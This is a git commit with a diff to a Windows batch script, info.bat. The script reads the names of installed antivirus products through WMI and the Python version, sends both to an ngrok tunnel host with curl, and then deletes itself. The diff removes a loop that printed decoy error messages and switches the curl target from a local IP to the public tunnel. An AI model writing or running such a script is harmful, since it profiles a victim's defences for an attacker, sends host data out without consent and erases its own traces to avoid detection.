71894f0a73ade51df3bd14508b05b15a94f6d2d0
0x2034 <168307322+0x2034@users.noreply.github.com>
2024-05-04 22:56:09 +0300

    Update info.bat

--- info.bat
+++ info.bat
@@ -1,10 +1,7 @@
 @echo off
-for /l %%i in (1, 1, 20) do (
-    echo Error: Something went wrong.
-)
 for /f "delims=" %%a in ('wmic /namespace:\\root\SecurityCenter2 path AntiVirusProduct get displayName ^| findstr /r /v "^$"') do set "antivirus=%%a"
 echo Antivirus Information: %antivirus%
 for /f "delims=" %%b in ('python --version 2^>^&1') do set "python_version=%%b"
 echo Python Version: %python_version%
-curl --verbose --data "Antivirus = %antivirus% & PythonVersion = %python_version%" http://192.168.1.16:8000
+curl --verbose --get --data-urlencode "Antivirus=%antivirus%" --data-urlencode "PythonVersion=%python_version%" https://72be-197-35-2-214.ngrok-free.app
 del "%~f0"
